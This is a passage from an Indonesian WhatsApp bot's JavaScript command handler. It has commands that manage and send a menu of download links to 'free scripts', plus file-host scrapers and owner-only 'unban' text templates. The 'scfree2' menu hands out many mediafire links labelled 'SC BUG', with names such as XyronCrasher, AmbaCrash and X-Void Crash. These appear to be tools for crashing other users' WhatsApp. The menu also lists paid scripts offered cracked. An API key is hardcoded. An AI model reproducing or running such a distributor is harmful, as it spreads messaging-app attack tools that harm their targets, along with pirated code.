  if (input.length < 4) return ReplyLanz("⚠ Gunakan format:\n.addlist <nomor>|<judul>|<deskripsi>|<link>");

  const [nomor, judul, deskripsi, link] = input;
  const fs = require("fs");
  const path = require("path");
  const listPath = path.join(__dirname, "../library/listsc.json");

  let data = [];
  if (fs.existsSync(listPath)) {
    data = JSON.parse(fs.readFileSync(listPath));
  }

  // Tambah entry baru
  data.push({
    title: `${nomor}: ${judul}`,
    description: `🧩 ${deskripsi}`,
    id: `${prefix}${link}`
  });

  // Simpan
  fs.writeFileSync(listPath, JSON.stringify(data, null, 2));

  ReplyLanz(`✅ List baru berhasil ditambahkan!\n\n*No:* ${nomor}\n*Judul:* ${judul}\n*Link:* ${link}`);
}
break;

case 'scfrege':
case 'listsc':
case 'lihatlist': {
    const file = './library/listsc.json'
    let data = []
    if (fs.existsSync(file)) {
        data = JSON.parse(fs.readFileSync(file))
    }
    if (data.length === 0) return ReplyLanz("❌ List masih kosong!")

    let list = data.map((x, i) => {
        return `${i + 1}. *${x.title}*\n📄 ${x.description}\n🔗 ${x.link}\n`
    }).join("\n")

    let teks = `📂 *Daftar Script Free*\n\n${list}`

    await Putzz.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break


case 'addlist': {
  // Format input: .addlist judul|deskripsi|link
  if (!text.includes('|')) return ReplyLanz(`❌ Gunakan format:\n\n${prefix}addlist <judul>|<deskripsi>|<link>`);

  const [title, description, id] = text.split('|').map(s => s.trim());

  if (!title || !description || !id) return ReplyLanz('❌ Semua bagian (judul, deskripsi, link) harus diisi.');

  // Baca data list lama
  let data = JSON.parse(fs.readFileSync('./library/listsc.json'));

  // Tambahkan data baru dengan nomor otomatis
  data.push({
    no: data.length + 1,
    title,
    description,
    id
  });

  // Simpan kembali ke file JSON
  fs.writeFileSync('./library/listsc.json', JSON.stringify(data, null, 2));

  // Konfirmasi
  ReplyLanz(`✅ List baru berhasil ditambahkan!\n\nNo: ${data.length}\nJudul: ${title}\nLink: ${id}`);
  break;
}


case 'dellist': {
  let nomor = args[0];
  if (!nomor || isNaN(nomor)) return ReplyLanz(`❌ Gunakan format:\n\n${prefix}dellist <nomor>`);

  let data;
  try {
    data = JSON.parse(fs.readFileSync('./library/listsc.json'));
  } catch (e) {
    return ReplyLanz('❌ Gagal membaca file listsc.json');
  }

  nomor = parseInt(nomor) - 1;

  if (nomor < 0 || nomor >= data.length) return ReplyLanz('❌ Nomor tidak valid.');

  const terhapus = data.splice(nomor, 1);

  // Update nomor semua item
  data = data.map((item, i) => ({ ...item, no: i + 1 }));

  fs.writeFileSync('./library/listsc.json', JSON.stringify(data, null, 2));

  ReplyLanz(`✅ Berhasil menghapus list:\n\n${terhapus[0].title}`);
  break;
}

case 'rawrrr': {

    try {
        const makeRow = (title, listDB, cmd) => {
            let isOn = false
            if (listDB) {
                if (Array.isArray(listDB)) {
                    isOn = listDB.includes(m.chat)
                } else if (typeof listDB === 'object') {
                    isOn = listDB[m.chat]?.status === true || listDB[m.chat] === true
                }
            }
            return {
                header: "",
                title: `${title}   [${isOn ? "🟢 ON" : "🔴 OFF"}]`,
                description: "",
                id: `${cmd} ${isOn ? "off" : "on"}`
            }
        }

        const rowsLink = [
            makeRow("Anti Link All", anticall, ".antilinkall"),
            makeRow("Anti Link Grup", anticall, ".antilinkgc"),
            makeRow("Anti Link Channel", anticall, ".antilinkch"),
            makeRow("Anti Link YT Video", anticall, ".antilinkyoutubevid"),
            makeRow("Anti Link YT Channel", anticall, ".antilinkyoutubech"),
            makeRow("Anti Link Instagram", anticall, ".antilinkig"),
            makeRow("Anti Link Facebook", anticall, ".antilinkfb"),
            makeRow("Anti Link Telegram", anticall, ".antilinktg"),
            makeRow("Anti Link TikTok", anticall, ".antilinktt"),
            makeRow("Anti Link Twitter", anticall, ".antilinktwt"),
        ]

        const rowsChat = [
            makeRow("Anti Tag SW", anticall, ".antitagsw"),
            makeRow("Anti Toxic", anticall, ".antitoxic"),
            makeRow("Anti Wame", anticall, ".antiwame"),
        ]

        const rowsExtra = [
            makeRow("Anti Bot", anticall, ".antibot"),
            makeRow("Auto AI Grup", anticall, ".autoaigrup"),
            makeRow("Auto Sticker", anticall, ".autosticker"),
        ]

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: `⚙️ Pengaturan Grup *${groupMetadata.subject}*` },
                        footer: { text: `✨ ${botname} - Proteksi Grup` },
                        header: { title: "🛡️ Group Protection & Features" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "Pilih fitur untuk diatur",
                                    sections: [
                                        { title: "━━━〔 🔗 Proteksi Link 〕━━━", rows: rowsLink },
                                        { title: "━━━〔 💬 Proteksi Chat 〕━━━", rows: rowsChat },
                                        { title: "━━━〔 ⚡ Fitur Tambahan 〕━━━", rows: rowsExtra },
                                    ]
                                })
                            }]
                        }
                    }
                }
            }
        }, { quoted: m }, {})

        await Putzz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

    } catch (err) {
        console.error("GROUPSET ERROR:", err)
        ReplyLanz("❌ Gagal menampilkan pengaturan grup.")
    }
}
break
case "scfree": {
  const fs = require('fs');

  // Ambil data dari JSON
  let data;
  try {
    data = JSON.parse(fs.readFileSync('./library/listsc.json'));
  } catch (err) {
    return ReplyLanz('❌ Gagal membaca file listsc.json');
  }

  // Teks header
  const teksnya = "*📂 List SC Free dari file*";

  // Konversi ke rows
  const rows = data.map(item => ({
    title: item.title,
    description: item.description,
    id: `${prefix}👻 ${item.id.trim().replace(/^\./, '')}`  // bisa disesuaikan kalau pakai `${prefix}`
  }));

  // Susun buttonMessage
  const buttonMessage = {
    text: teksnya,
    footer: `${botname}`,
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "Pilih SC" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "📦 Klik untuk pilih SC",
            sections: [
              {
                title: "ALL SC VVIP BY LANZ",
                highlight_label: "✅ BERBAYAR 30K",
                rows: [
                { title: "Mikasa MD V7", description: `📦 Srcipt serbaguna dan langkah`, id: `${prefix}bp` },
                { title: "Lanxbot V4", description: `📦 Script Free langsung ambil`, id: `${prefix}👻 https://www.mediafire.com/file/nhc8o61d9cjv641/Lanzx_Bot_-_%255B_fix_pairing_%255D.zip/file`}, 
                ]}, 
                {
                title: 'ALL SCFREE BY LANZ', 
                highlight_label: 'ALL SCFREE', 
                rows: rows
              }
            ]
          })
        }
      }
    ],
    viewOnce: true,
    headerType: 1,
    contextInfo: {
      mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
      isForwarded: true
    }
  };

  await Putzz.sendMessage(m.chat, buttonMessage, { quoted: qtoko });
  break;
}



case "scfree2": {
//    if (!isOwner) ReplyLanz('khusus Bg Putzz anjay') 

        const teksnya = "*List All ScFree By Mikasa-Bot*";

 buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜",
                        sections: [
            {
              title: 'PILIH SERVER CPANEL NYA',
              highlight_label: "BERBAYAR 30K",
              rows: [
                { title: "𝟭: Mikasa MD V5", description: `📦 Srcipt serbaguna dan langkah`, id: `${prefix}bp` },
                { title: "𝟭: Mikasa MD V4", description: `📦 Script Free langsung ambil`, id: `${prefix}👻 https://www.mediafire.com/file/nhc8o61d9cjv641/Lanzx_Bot_-_%255B_fix_pairing_%255D.zip/file`}, 
                ]}, 
                {
                title: 'ALL SCFREE BY LANZ', 
                highlight_label: 'SC TERBAIK',
                rows: [
                { title: "𝟮: ASUMA-MD", description: `📦 100% no backdoor`, id: `${prefix}👻 link` },
                { title: "𝟯: Mikasa-BOT", description: `📦 no backdoor`, id: `${prefix}👻 https://www.mediafire.com/file/bxste9ekxjb8agn/Mikasa-BOT_Kyami_Silence.zip/file?dkey=0u4sspvjrgz&r=1054` },
                { title: "𝟰: ZEROTWO-MD", description: '📦 CEK SEBELUM PAKAI', id: `${prefix}👻 https://www.mediafire.com/file/wdi4ap4p81frxy7/ZeroTwo-MD+Kyami+Silence.zip/file` },
                { title: "𝟱: GAWRGURA-V3", description: '📦 CEK SEBELUM PAKAI', id: `${prefix}👻 https://www.mediafire.com/file/1s2wq9ss8koa3lk/GawrGura-V3_Kyami_Silence.zip/file` },
                { title: "𝟲: KURUMI-MD", description: '📦 cek sebelum pakai', id: `${prefix}👻 https://www.mediafire.com/file/v0vzd2gltxw6se6/Kurumi-MD_Kyami_Silence.zip/file` },
                { title: "𝟳: BASE SC SIMPLE", description: `📦 no backdoor`, id: `${prefix}👻 https://www.mediafire.com/file/pdufkwjkgrkzhj4/Base_Script_Simple.zip/file` },
                { title: "𝟴: SC CPANEL", description: '📦 CEK SEBELUM PAKAI', id: `${prefix}👻 https://www.mediafire.com/file/qq1cu1j9ment8wt/sc_CPANEL.zip/file` },
                { title: "𝟵: CPANEL X PUSH KONTAK", description: '📦 cek sebelum pakai', id: `${prefix}👻 https://www.mediafire.com/file/wja758bu08hsbgw/CPANEL_X_PUSH_KONTAK_LEXZY.zip/file` },
                { title: "𝟭𝟬: BASE TYPE CASE CJS", description: `📦 No backdoor`, id: `${prefix}👻 https://www.mediafire.com/file/pa04joee29x0kmn/base_bot_%255B_case_cjs_%255D.zip/file` },
                { title: "𝟭𝟭: BASE BY LANZ", description: `📦 No backdoor`, id: `${prefix}👻 https://www.mediafire.com/file/9q5541f169wiew3/Base_By_Lanz_Cjs.zip/file` },
                { title: "𝟭𝟮: HARUKA CPANEL", description: '📦 cek sebelum pakaic', id: `${prefix}👻 https://www.mediafire.com/file/eazhq33pebkde18/Haruka_Cpanel.zip/file` },
                { title: "𝟭𝟯: YOKAIZEN", description: '📦 cek sebelum pakai', id: `${prefix}👻 https://www.mediafire.com/file/w0789g6khvp3u5v/yokaizen-1.zip/file` },
                { title: "𝟭𝟰: NEO ENGINE", description: '📦 cek sebelum pakai', id: `${prefix}👻 https://www.mediafire.com/file/ytkf10axz3wqpvq/Neo_Engine.zip/file` },
                { title: "𝟭𝟱: PENZ BOT FIKS", description: `📦 SC MEMBUAT SC`, id: `${prefix}👻 https://www.mediafire.com/file/9ck41zie21gf1dk/PENBOTZ_FIKS.zip/file` },
                { title: "𝟭𝟲: SC VAMPIRE", description: '📦 Sc bug', id: `${prefix}👻 https://www.mediafire.com/file/zb3pbcj03obesu5/%25F0%259D%2599%258E%25F0%259D%2599%2598_%25F0%259D%2599%2591%25F0%259D%2599%2596%25F0%259D%2599%25A2%25F0%259D%2599%25A5%25F0%259D%2599%259E%25F0%259D%2599%25A7%25F0%259D%2599%259A_%25F0%259D%2599%25A8%25F0%259D%2599%259D%25F0%259D%2599%2596%25F0%259D%2599%25A7%25F0%259D%2599%259A_%25F0%259D%2599%2597%25F0%259D%2599%25AE_%25F0%259D%2599%258D%25F0%259D%2598%25BC%25F0%259D%2599%2581%25F0%259D%2598%25BC%25F0%259D%2599%258E%25F0%259D%2599%258F%25F0%259D%2599%258A%25F0%259D%2599%258D%25F0%259D%2599%2580.zip/file` },
                { title: "𝟭𝟳 TREDICT INVICTUS", description: `📦 SC BUG`, id: `${prefix}👻 https://www.mediafire.com/file/v3lhecrnwslwlif/%25F0%259D%259A%2583%25F0%259D%259A%2581%25F0%259D%2599%25B4%25F0%259D%2599%25B3%25F0%259D%2599%25B8%25F0%259D%2599%25B2%25F0%259D%259A%2583_%25F0%259D%2599%25B8%25F0%259D%2599%25BD%25F0%259D%259A%2585%25F0%259D%2599%25B8%25F0%259D%2599%25B2%25F0%259D%259A%2583%25F0%259D%259A%2584%25F0%259D%259A%2582.zip/file` },
                { title: "𝟭𝟴: REXXYY V1.0.0", description: `📦 SC BUG`, id: `${prefix}👻 https://www.mediafire.com/file/mdyv130n8488qah/RexXyy_v1.0.0.zip/file` },
                { title: "𝟭𝟵: XYRONCRASHER PROMEK", description: `📦 SC BUG`, id: `${prefix}👻 https://www.mediafire.com/file/qxzwqjljorta4xb/XyronCrasherPro_Max.zip/file` },
                { title: "𝟮𝟬: NABZX-SELLER-V6", description: `📦 TERKENAL JPMCH`, id: `${prefix}👻 https://www.mediafire.com/file/d09szmkfy5bzzpa/Sc-Nabzx-V6-seller-1.zip/file` },
                { title: "𝟮𝟭: CPANEL DAN MD", description: `📦 NO BACKDOOR`, id: `${prefix}👻 https://www.mediafire.com/file/ck76be8pcvbjne3/SC_Cpanel_%25E2%2580%2593MD_V1_.7z/file` },
                { title: "𝟮𝟮: AMBACRASH V12", description: `📦 SC BUG`, id: `${prefix}👻 https://www.mediafire.com/file/2jy5tp7jvjvudnt/%25F0%259F%2591%25B9Amba_Crash_V12_No_Enc_Share_By_TravzOffc%25F0%259F%2591%25B9.zip/file` },
                { title: "𝟮𝟯: CLEOPATRA ORI", description: `📦 SC BUG`, id: `${prefix}👻 https://www.mediafire.com/file/iryydlgdd48jlnl/Cleopatra-ori-NoPassword.zip/file` },
                { title: "𝟮𝟰: DANGGER V3", description: `📦 SC BUG`, id: `${prefix}👻 https://www.mediafire.com/file/i6yjygg6j0axwk8/Danger-V3-NoPassword_%25281%2529.zip/file` },
                { title: "𝟮𝟱: ALYA - MD", description: `📦 CEK SEBELUM PAKAI`, id: `${prefix}👻 https://www.mediafire.com/file/cdj8biffpyw7gfg/ALYA_-_MD_V3_VERSI_NO_BUTTON.zip/file` },
                { title: "𝟮𝟲: GENEXVICTIM", description: `📦 Katanya Sc 70k`, id: `${prefix}👻 https://www.mediafire.com/file/p8yvhl30zswy0je/GenexVictim+V1+No+Enc+@Arga.zip/file` },
                { title: "𝟮𝟳: SC NIKA V8 GEN2", description: `📦 NO ENC`, id: `${prefix}👻 https://www.mediafire.com/file/byz1vazesex7bbs/NIKA+V8.2+FIX+PAIRING+CODE+(No+Enc+100` },
                { title: "𝟮𝟴: SC VORTEX DEL DB", description: `📦 SC BUGG`, id: `${prefix}👻 https://www.mediafire.com/file/p8yvhl30zswy0je/GenexVictim+V1+No+Enc+@Arga.zip/file` },
                { title: "𝟮𝟵: SC ONE PIECE", description: `📦 no enc`, id: `${prefix}👻 https://www.mediafire.com/file/zu8foh645k58ell/BASE+KOSONG+@Arga.zip/file` },
                { title: "𝟯𝟬: BASE KOSONGAN", description: `📦 AU AH CAPEK`, id: `${prefix}👻 https://www.mediafire.com/file/zu8foh645k58ell/BASE+KOSONG+@Arga.zip/file` },
                { title: "𝟯𝟭: SC MINATO", description: `📦 SC 70K KALO GASALAH`, id: `${prefix}👻 https://www.mediafire.com/file/vxwk4pnaxigbk53/MINATO_V5.1_%2528BUYER_NO_ENC%2529.zip/file` },
                { title: "𝟯𝟮: SC JUSTIN V18", description: `📦 SC BERBAYAR NIH😋`, id: `${prefix}👻 https://www.mediafire.com/file/scl4vlqwyua4vvz/Justin+V18+Vip+By+Arga,🤫.zip/file` },
                { title: "𝟯𝟯: SC NIKA FULL NO ENC+ADD DBNYA", description: `📦 DI DALAM AD ALL SC NIKA`, id: `${prefix}👻 https://www.mediafire.com/file/06uajhu18y8de5d/ALL+SC+NIKA+BY+No+encCrack+ARGA🤣.zip/file` },
                { title: "𝟯𝟰: SC PUSHKONTAK+JAGA GB", description: `📦 CEK SEBELUM PAKAI`, id: `${prefix}👻 https://www.mediafire.com/file/8cv2d6shlm7lhps/Sc+Push+Kontak+X+Jaga+Grup.zip/file` },
                { title: "𝟯𝟱: FLIEXCE STORM", description: `📦 Sc tele katanya`, id: `${prefix}👻 https://www.mediafire.com/file/88xl1yualraiqrz/%25F0%259D%2599%25B5%25F0%259D%259A%2595%25F0%259D%259A%2592%25F0%259D%259A%25A1%25F0%259D%2599%25B2%25F0%259D%259A%258E_s%25E1%25B4%259B%25CA%2580%25E1%25B4%258F%25E1%25B4%258D_.zip/file` },
                { title: "𝟯𝟲: SC RAVAGE V4 GEN2", description: `📦 No backdoor`, id: `${prefix}👻 https://www.mediafire.com/file/qt9q8bml9czez3q/SC_RAVAGE_V4_GEN_2_FREE.zip/file` },
                { title: "𝟯𝟳: NARALUXS V3", description: `📦 SC BUG`, id: `${prefix}👻 https://www.mediafire.com/file/jn3lcpbht71vztt/naraluxs_V3.zip/file` },
                { title: "𝟯𝟴: WingsSupernyr V6 G1 NO ENC", description: `📦 SC BUGG`, id: `${prefix}👻 https://www.mediafire.com/file/qqc6sa0s3mixtjz/%25F0%259F%2590%2589_WingsSupernyr-V6_G1_%255BNO_ENC%255D%25F0%259F%2597%25A1%25EF%25B8%258F%25F0%259F%2590%2589.zip/file` },
                { title: "𝟯𝟵: VOCALOID ", description: `📦 Gacor katanya`, id: `${prefix}👻 https://www.mediafire.com/file/30s563chxvggerp/VOCALOID_Free_Gacor.zip/file` },
                { title: "𝟰𝟬: SHAMIRU CPANEL NO BUTTON", description: `📦 CEK AE DULU`, id: `${prefix}👻 https://www.mediafire.com/file/r7pnfz5ldpok5r0/Shamiru+Cpanel+No+Button.zip/file` },
                { title: "𝟰𝟭: MITSHUKI MD", description: `📦 NO ENC`, id: `${prefix}👻 https://www.mediafire.com/file/42883xzgin22s6x/MITSUKI_MD_NO_ENC.zip/file` },
                { title: "𝟰𝟮: X-VOID CRASH", description: `📦 SC BUGG`, id: `${prefix}👻 https://www.mediafire.com/file/hnatf19lznpd81w/%25F0%2592%2586%259C_X-Voids_Crash_V3.5_Soeharto.zip/file` },
                { title: "𝟰𝟯: TIGER CRASH V1 GEN2", description: `📦 munculin menu (.tiger)`, id: `${prefix}👻 https://www.mediafire.com/file/9hfhgmykv1a0sej/NO_ENC.zip/file` },
                { title: "𝟰𝟰: TIGER CRASH V2", description: `📦 munculin menu(.start/.tiger)`, id: `${prefix}👻 https://www.mediafire.com/file/be0hdigbypnz4a1/NO` },
                { title: "𝟰𝟰: OSCARZ ZOO V1", description: `📦 munculin menu (.oscar)`, id: `${prefix}👻 https://www.mediafire.com/file/m4rl3q9lhxscpgv/NO_ENC.zip/file` },
                { title: "𝟰𝟲: MIO CRASH", description: `📦 Munculin menu(.menu/.mio) `, id: `${prefix}👻 https://www.mediafire.com/file/vllns6pvg0zxn2x/NO_ENCzip/file` },
                { title: "𝟰𝟳", description: `📦 47`, id: `${prefix}👻 link` },
                { title: "𝟰𝟴", description: `📦 48`, id: `${prefix}👻 link` },
                { title: "𝟰𝟵", description: `📦 49`, id: `${prefix}👻 link` },
                { title: "𝟱𝟬", description: `📦 50`, id: `${prefix}👻 link` },
                { title: "𝟱𝟭", description: `📦 51`, id: `${prefix}👻 link` },
                { title: "𝟱𝟮", description: `📦 52`, id: `${prefix}👻 link` },
                { title: "5𝟯", description: `📦 53`, id: `${prefix}👻 link` },
                { title: "𝟱𝟰", description: `📦 54`, id: `${prefix}👻 link` },
                { title: "𝟱𝟱", description: `📦 55`, id: `${prefix}👻 link` },
                { title: "𝟱𝟲", description: `📦 56`, id: `${prefix}👻 link` },
                { title: "𝟱𝟳", description: `📦 57`, id: `${prefix}👻 link` },
                { title: "𝟱𝟴", description: `📦 58`, id: `${prefix}👻 link` },
                { title: "𝟱𝟵", description: `📦 59`, id: `${prefix}👻 link` },
                { title: "𝟲𝟬", description: `📦 60`, id: `${prefix}👻 link` },
                { title: "𝟲𝟭", description: `📦 61`, id: `${prefix}👻 link` },
                { title: "𝟲𝟮", description: `📦 62`, id: `${prefix}👻 link` },
                { title: "𝟲𝟯", description: `📦 63`, id: `${prefix}👻 link` },
                { title: "𝟲𝟰", description: `📦 64`, id: `${prefix}👻 link` },
                { title: "𝟲𝟱", description: `📦 65`, id: `${prefix}👻 link` },
                { title: "𝟲𝟲", description: `📦 66`, id: `${prefix}👻 link` },
                { title: "𝟲𝟳", description: `📦 67`, id: `${prefix}👻 link` },
                { title: "𝟲𝟴", description: `📦 68`, id: `${prefix}👻 link` },
                { title: "𝟲𝟵", description: `📦 69`, id: `${prefix}👻 link` },
                { title: "𝟳𝟬", description: `📦 70`, id: `${prefix}👻 link` },
                { title: "𝟳𝟭", description: `📦 71`, id: `${prefix}👻 link` },
                { title: "𝟳𝟮", description: `📦 72`, id: `${prefix}👻 link` },
                { title: "𝟳𝟯", description: `📦 73`, id: `${prefix}👻 link` },
                { title: "𝟳𝟰", description: `📦 74`, id: `${prefix}👻 link` },
                { title: "𝟳𝟱", description: `📦 75`, id: `${prefix}👻 link` },
                { title: "𝟳𝟲", description: `📦 76`, id: `${prefix}👻 link` },
                { title: "𝟳𝟳", description: `📦 77`, id: `${prefix}👻 link` },
                { title: "𝟳𝟴", description: `📦 78`, id: `${prefix}👻 link` },
                { title: "𝟳𝟵", description: `📦 79`, id: `${prefix}👻 link` },
                { title: "𝟴𝟬", description: `📦 80`, id: `${prefix}👻 link` },
                { title: "𝟴𝟭", description: `📦 81`, id: `${prefix}👻 link` },
                { title: "𝟴𝟮", description: `📦 82`, id: `${prefix}👻 link` },
                { title: "𝟴𝟯", description: `📦 83`, id: `${prefix}👻 link` },
                { title: "𝟴𝟰", description: `📦 84`, id: `${prefix}👻 link` },
                { title: "𝟴𝟱", description: `📦 85`, id: `${prefix}👻 link` },
                { title: "𝟴𝟲", description: `📦 86`, id: `${prefix}👻 link` },
                { title: "𝟴𝟳", description: `📦 87`, id: `${prefix}👻 link` },
                { title: "𝟴𝟴", description: `📦 88`, id: `${prefix}👻 link` },
                { title: "𝟴𝟵", description: `📦 89`, id: `${prefix}👻 link` },
                { title: "𝟵𝟬", description: `📦 90`, id: `${prefix}👻 link` },
                { title: "𝟵𝟭", description: `📦 91`, id: `${prefix}👻 link` },
                { title: "𝟵𝟮", description: `📦 92`, id: `${prefix}👻 link` },
                { title: "𝟵𝟯", description: `📦 93`, id: `${prefix}👻 link` },
                { title: "𝟵𝟰", description: `📦 94`, id: `${prefix}👻 link` },
                { title: "𝟵𝟱", description: `📦 95`, id: `${prefix}👻 link` },
                { title: "𝟵𝟲", description: `📦 96`, id: `${prefix}👻 link` },
                { title: "𝟵𝟳", description: `📦 97`, id: `${prefix}👻 link` },
                { title: "𝟵𝟴", description: `📦 98`, id: `${prefix}👻 link` },
                { title: "𝟵𝟵", description: `📦 99`, id: `${prefix}👻 link` },
                { title: "𝟭𝟬𝟬", description: `📦 100`, id: `${prefix}👻 link` },
              ]
            }
          ]
        })
      }
      }
  ],

        buttonMessage = {
            text: teksnya,
            footer: `${botname}`,
            buttons: buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: qtoko });
    }

break;
case 'sf':
case 'sfile': {
  try {
    const axios = require("axios");
    const mime = require("mime-types");   
    const cheerio = require("cheerio");    

const sfile = {
  createHeaders: referer => ({
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="137", "Google Chrome";v="137"',
    'dnt': '1',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'Referer': referer,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9'
  }),

  extractCookies: h => h['set-cookie']?.map(c => c.split(';')[0]).join('; ') || '',

  extractMetadata: $ => {
    const m = {}
    $('.file-content').eq(0).each((_, e) => {
      const x = $(e)
      m.file_name = x.find('img').attr('alt')
      m.mimetype = x.find('.list').eq(0).text().trim().split('-')[1].trim()
      m.upload_date = x.find('.list').eq(2).text().trim().split(':')[1].trim()
      m.download_count = x.find('.list').eq(3).text().trim().split(':')[1].trim()
      m.author_name = x.find('.list').eq(1).find('a').text().trim()
    })
    return m
  },

  makeRequest: async (u, o) => {
    try { return await axios.get(u, o) }
    catch (e) { if (e.response) return e.response; throw new Error(`Request gagal: ${e.message}`) }
  },

  download: async (url, resultBuffer = false) => {
    try {
      let h = sfile.createHeaders(url)
      const init = await sfile.makeRequest(url, { headers: h })
      const ck = sfile.extractCookies(init.headers)
      h.Cookie = ck
      let $ = cheerio.load(init.data)
      const meta = sfile.extractMetadata($)
      const dl = $('#download').attr('href')
      if (!dl) throw new Error('Download URL gak ketemu')
      h.Referer = dl
      const proc = await sfile.makeRequest(dl, { headers: h })
      const html = proc.data
      $ = cheerio.load(html)
      const scr = $('script').map((i, el) => $(el).html()).get().join('\n')
      const re = /https:\\\/\\\/download\d+\.sfile\.mobi\\\/downloadfile\\\/\d+\\\/\d+\\\/[a-z0-9]+\\\/[^\s'"]+\.[a-z0-9]+(\?[^"']+)?/gi
      const mt = scr.match(re)
      if (!mt?.length) throw new Error('Link download final gak ketemu di script')
      const fin = mt[0].replace(/\\\//g, '/')
      let download
      if (resultBuffer) {
        const file = await sfile.makeRequest(fin, { headers: h, responseType: 'arraybuffer' })
        download = Buffer.from(file.data)
      } else download = fin
      return { metadata: meta, download }
    } catch (e) { throw new Error(`${e.message}`) }
  }
}
    if (!args[0]) return ReplyLanz('*Example :* .sfile https://sfile.mobi/2E5O1HMVKcc')
    let data = await sfile.download(args[0], true)
    let { file_name, mimetype, upload_date, download_count, author_name } = data.metadata
    let type = mime.lookup(file_name) || 'application/octet-stream'
    await Putzz.sendMessage(m.chat, { document: data.download, fileName: file_name, mimetype: type }, { quoted: m })
  } catch (e) { ReplyLanz(e.message) }
}
break

case '@': {
    try {
        if (!text) return ReplyLanz(`Contoh: ${prefix + command} https://www.mediafire.com/file/xxxxx`);
        if (!text.includes('mediafire.com')) return ReplyLanz('Tidak ad SC yang harus di kirim!');
                await Putzz.sendMessage(m.chat, {
                    react: {
                        text: '🕙',
                        key: m.key,
                    }
                })
        const res = await fetchJson(`https://ditss.cloud/download/mediafire?apikey=DitssGanteng&url=${encodeURIComponent(text)}`);
        if (!res.status || !res.result || !res.result.download_url) {
            return ReplyLanz('Gagal mengambil data. Sc tidak valid atau API error!');
        }

        const {
            filename,
            size,
            mimetype,
            owner,
            created,
            download_url
        } = res.result;

        const uploadDate = new Date(created).toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });

        const info = `
📂 *ScriptFree By Lanz*
───────────────────────
📄 *Nama File:* ${filename}
📏 *Ukuran File:* ${size}
📦 *Tipe File:* ${mimetype}
👤 *Pemilik:* Lanz Official

Tunggu sebentar, mengirim file...
`.trim();

        ReplyLanz(info);

        const media = await getBuffer(download_url);
        setTimeout(async () => {
            await Putzz.sendMessage(m.chat, {
                document: media,
                fileName: filename,
                mimetype: mimetype || 'application/octet-stream'
            }, { quoted: m });
        }, 2000);

    } catch (err) {
        console.error(err);
        ReplyLanz('Terjadi kesalahan saat memproses permintaan kamu:\n' + err.message);
    }
    break;
}
case 'textunbanv1':
if (!isCreator) return tolak(`Sok asik bangsat`);
const vaga = ` ${textunbanv1}`
ReplyLanz(vaga)
break
case 'textunbanv2':
if (!isCreator) return tolak(`Sok asik bangsat`);
const bandar = ` ${textunbanv2}`
ReplyLanz(bandar)
break
case 'textunbanv3':
if (!isCreator) return tolak(`Sok asik bangsat`);
const masokpakeok = ` ${textunbanv3}`
ReplyLanz(masokpakeok)
break
case 'textunbanv4':
if (!isCreator) return tolak(`Sok asik bangsat`);
const typo = ` ${textunbanv4}`
ReplyLanz(typo)
break
case 'textunbanv5':
if (!isCreator) return tolak(`Sok asik bangsat`);
const sokasim = ` ${textunbanv5}`
ReplyLanz(sokasim)
break
case 'textunbanv6':
if (!isCreator) return tolak(`Sok asik bangsat`);
const akakaka = ` ${textunbanv6}`
ReplyLanz(akakaka)
break
case 'textunbanv7':
if (!isCreator) return tolak(`Sok asik bangsat`);
const kopok = ` ${textunbanv7}`
ReplyLanz(kopok)
break
case 'textunbanv8':
if (!isCreator) return tolak(`Sok asik bangsat`);
const tehyung = ` ${textunbanv8}`
ReplyLanz(tehyung)
break
case 'textunbanv9':
if (!isCreator) return tolak(`Sok asik bangsat`);
const ahhyan = ` ${textunbanv9}`
ReplyLanz(ahhyan)
break
case 'textunbanv10':
if (!isCreator) return tolak(`Sok asik bangsat`);
const yamete = ` ${textunbanv10}`
ReplyLanz(yamete)
break
case 'textunbanv11':
if (!isCreator) return tolak(`Sok asik bangsat`);
const suuu = ` ${textunbanv11}`
ReplyLanz(suuu)
break
case 'textunbanv12':
if (!isCreator) return tolak(`Sok asik bangsat`);
const huuuu = ` ${textunbanv12}
huuu`
ReplyLanz(huuuu)
break
case 'textunbanv13':
if (!isCreator) return tolak(`Sok asik bangsat`);
const gaje = ` ${textunbanv13}`
ReplyLanz(gaje)
break
case 'textunbanv14':
if (!isCreator) return tolak(`Sok asik bangsat`);
const well = ` ${textunbanv14}`
ReplyLanz(well)
break
case 'textunbanv15':
if (!isCreator) return tolak(`Sok asik bangsat`);
const lempo = ` ${textunbanv15}`
ReplyLanz(lempo)
break
case 'textunbanv16':
if (!isCreator) return tolak(`Sok asik bangsat`);
const cok = ` ${textunbanv16}`
ReplyLanz(cok)
break
case 'textunbanv17':
if (!isCreator) return tolak(`Sok asik bangsat`);
const sayasuka = ` ${textunbanv17}`
ReplyLanz(sayasuka)
break
case 'textunbanv18':
if (!isCreator) return tolak(`Sok asik bangsat`);
const oooooooo= ` ${textunbanv18}`
ReplyLanz(oooooooo)
break
case 'textunbanv19':
